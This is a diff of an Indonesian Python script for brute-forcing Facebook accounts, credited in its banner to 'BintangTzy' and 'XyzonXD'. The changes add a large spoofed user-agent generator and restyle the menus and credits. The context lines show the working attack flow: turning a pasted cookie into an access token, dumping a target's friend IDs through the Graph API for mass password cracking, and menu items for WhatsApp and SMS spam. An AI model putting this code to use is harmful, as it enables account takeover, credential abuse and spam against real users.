@@ -50,42 +50,147 @@ ses=requests.Session()
 id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
 ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
 sys.stdout.write('\x1b]2; XMBF | Xyzon Multi Brute Facebook\x07')
-#------------------[ USER-AGENT ]-------------------#
-try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
-	open('.prox.txt','w').write(prox)
-except Exception as e:
-	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD')
-prox=open('.prox.txt','r').read().splitlines()
-for xd in range(10000):
-	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	c=random.randrange(73,100)
-	d=random.randrange(4200,4900)
-	e=random.randrange(40,150)
-	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
-	ugen2.append(uaku)
-
-for t in range(10000):
-	rr = random.randint
-	brayen1=f'Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X655F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36'
-	brayen2=f'Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X689F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36'
-	brayen3=f'Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36'
-	uaku2 = random.choice([brayen1,brayen2,brayen3])
-	ugen.append(uaku2)
+###----------[ GENERATE USERAGENT ]---------- ###
+for xd in range(10000) :
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e='Mobile Safari/537.36'
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
 	
-for x in range(10):
-	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	c=random.randrange(73,100)
-	d=random.randrange(4200,4900)
-	e=random.randrange(40,150)
-	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e='Mobile Safari/537.36'
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='Moto G (5) Plus Build/NPNS25.137-35-5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='Moto G (5S) Plus Build/NPS26.116-51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.randrange(6, 14) 
+	c='SM-A105'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	e=str(random.randrange(10, 214))+'.0.'+str(random.randrange(3000, 7000))+'.'+str(random.randrange(10, 275)) 
+	f=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	geko=f'{a} {b}; {c}) {d}{e} {f}'
+	ugen2.append(geko) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='Moto G Play Build/NPIS26.48-43-2) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam)  
+	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.randrange(1, 14) 
+	c='RMX'
+	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
+	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	g='Mobile Safari/537.36'
+	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
+	ugen.append(uga) 
+	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.randrange(1, 14) 
+	c='CPH'
+	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
+	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	g='Mobile Safari/537.36'
+	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
+	ugen.append(uga) 
+	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.randrange(1, 14) 
+	c='vivo'
+	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
+	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	g='Mobile Safari/537.36'
+	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
+	ugen.append(uga) 
 def uaku():
 	try:
 		ua=open('bbnew.txt','r').read().splitlines()
 		for ub in ua:
-			ugen.append(ub)
+			ugen2.append(ub)
 	except:
 		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
 		ua=open('.bbnew.txt','w')
@@ -193,7 +298,7 @@ def login():
 		
 def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadimariketemupepekkudajanganlarislebewindonesiaandlampungnihbossenggoldongnantimatiawokawokawokaowkawokawokawokawok():
 	try:
-		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
+		cetak(nel('[bold cyan]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
 		your_cookies = input(' [+] Masukan Cookie : ')
 		with requests.Session() as r:
 			try:
@@ -206,7 +311,7 @@ def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadima
 				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
 				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
 				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
+					print(" [+] \33[1;91mCookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
 				else:
 					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
 					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
@@ -241,9 +346,9 @@ def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadima
 							print(f"\n [+] Token : {access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print("\n [+] Login Berhasil | python BrayennnFB.py");exit()
+							print("\n [+] \33[1;96mLogin Berhasil | python run.py");exit()
 			except Exception as e:
-				print(" [+] Cookies Mokad Kontol")
+				print(" [+] \33[1;91mCookies Mokad Kontol")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
 				print(e)
 				time.sleep(3)
@@ -262,11 +367,11 @@ def menu(my_name,my_id):
 	banner()
 	ip = requests.get("https://api.ipify.org").text
 	pengguna = requests.get('https://api.countapi.xyz/hit/Brayen/visits').json()["value"]	
-	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/]\n[bold white][+[/][bold white]][/] [bold white]User Sc  : [bold green]{pengguna}[/][/] ',width=43,padding=(0,3),style=f"bold white"))
-	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Author : [bold green]Alvino[/]\n[bold white][+[/][bold white]][/] [bold white]Recode : [bold green]BrayennnXD[/]\n[bold white][+[/][bold white]][/] [bold white]Versi  : [bold green]3.1[/][/]\n[bold white][+[/][bold white]][/] [bold white]Status : [bold green]Free[/][/] ',width=44,padding=(0,3),style=f"bold white"))
+	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold cyan]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold cyan]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/]\n[bold white][+[/][bold white]][/] [bold cyan]User Sc  : [bold green]{pengguna}[/][/] ',width=43,padding=(0,3),style=f"bold white"))
+	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold cyan]Author : [bold green]BintangTzy[/]\n[bold white][+[/][bold white]][/] [bold cyan]Recode : [bold green]XyzonXD[/]\n[bold white][+[/][bold white]][/] [bold cyan]Versi  : [bold green]2.1[/][/]\n[bold white][+[/][bold white]][/] [bold cyan]Status : [bold green]Premium[/][/] ',width=44,padding=(0,3),style=f"bold white"))
 	console.print(Columns(dia))
-	cetak(panel(f'[bold cyan]Terima Kasih Kepada [bold green]BintangTzy[bold cyan] Yang Telah Membuat Script Ini, Premium Multi Brute Facebook',width=90,style=f"bold white"))
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Crack Publick  [bold white][[bold green] ON [bold white]][/]             [bold white][[bold green]07[/][bold white]][/] [bold cyan]Cek Hasil Crack [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Crack Massal [bold white][[bold green] ON [bold white]]               [bold white][[bold green]08[/][bold white]][/] [bold cyan]Cek Hasil CP [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Crack Username [bold white][[bold green] ON [bold white]]             [bold white][[bold green]09[/][bold white]][/] [bold cyan]Spam Whatsapp [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold cyan]Crack Grup [bold white][[bold green] ON [bold white]][/]                 [bold white][[bold green]10[/][bold white]][/] [bold cyan]Spam Sms [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold cyan]Crack Followers [bold white][[bold green] ON [bold white]]            [bold white][[bold green]11[/][bold white]][/] [bold cyan]Report Bug [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold cyan]Crack Email [bold white][[bold green] ON [bold white]]                [bold white][[bold red]00[/][bold white]][/] [bold red]Hapus Cookies [bold white][[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",padding=(0,8),style=f"bold white"))
+	cetak(panel(f'[bold cyan]Terima Kasih Kepada [bold green]BintangTzy[bold cyan] Yang Telah Membuat Script Ini, XyzonXD Multi Brute Facebook',width=90,style=f"bold white"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Crack Publick  [bold white][[bold green] ON [bold white]][/]                [bold white][[bold green]07[/][bold white]][/] [bold cyan]Cek Hasil Crack [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Crack Massal [bold white][[bold green] ON [bold white]]                  [bold white][[bold green]08[/][bold white]][/] [bold cyan]Cek Hasil CP [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Crack Username [bold white][[bold green] ON [bold white]]                [bold white][[bold green]09[/][bold white]][/] [bold cyan]Spam Whatsapp [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold cyan]Crack Grup [bold white][[bold green] ON [bold white]][/]                    [bold white][[bold green]10[/][bold white]][/] [bold cyan]Spam Sms [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold cyan]Crack Followers [bold white][[bold green] ON [bold white]]               [bold white][[bold green]11[/][bold white]][/] [bold cyan]Report Bug [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold cyan]Crack Email [bold white][[bold green] ON [bold white]]                   [bold white][[bold red]00[/][bold white]][/] [bold red]Hapus Cookies [bold white][[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",padding=(0,8),style=f"bold white"))
 	cetak(panel(f'[bold Red]Warning[bold cyan] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan [bold green]By XyzonXD',width=90,title=f"[bold green]Informasi Crack",style=f"bold white"))
 	_____xyzon___xd____ = input(f' {P}[{H}+{P}] \33[1;96mPilih Menu Crack : {P}')
 	if _____xyzon___xd____ in ['1','01']:
@@ -1075,7 +1180,7 @@ def xyzoncrackpublik():
 		kukis = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	cetak(panel('\t[bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
+	cetak(panel('\t            [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
 	pil = input(f' {P}[{H}+{P}]\33[1;96m Target ID :{P} ')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
@@ -1099,7 +1204,7 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		cetak(panel('            [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
+		cetak(panel('\t            [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
 		jum = int(input(f' {P}[{H}+{P}]\33[1;96m Mau Berapa Idz Target  :{P} '))
 	except ValueError:
 		print(' [+]\33[1;91m Wrong input ')
@@ -1141,8 +1246,8 @@ def dump_massal():
 
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack Idz Old Ke New [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Idz New Ke Old [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,padding=(0,8),title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
-	hu = input(f' [+] Pilih Urutan Idz : ')
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Crack Idz Old Ke New [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Crack Idz New Ke Old [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,padding=(0,8),title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
+	hu = input(f' {P}[{H}+{P}] \33[1;96mPilih Urutan Idz : {P}')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -1161,15 +1266,15 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print(' [+] Pilih Yang Bener Kontooll ')
+		print(' [+] \33[1;91mPilih Yang Bener Kontooll ')
 		exit()
 	urut = []
-	urut.append(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=43,title=f"[bold green]Validate",style=f"bold white"))
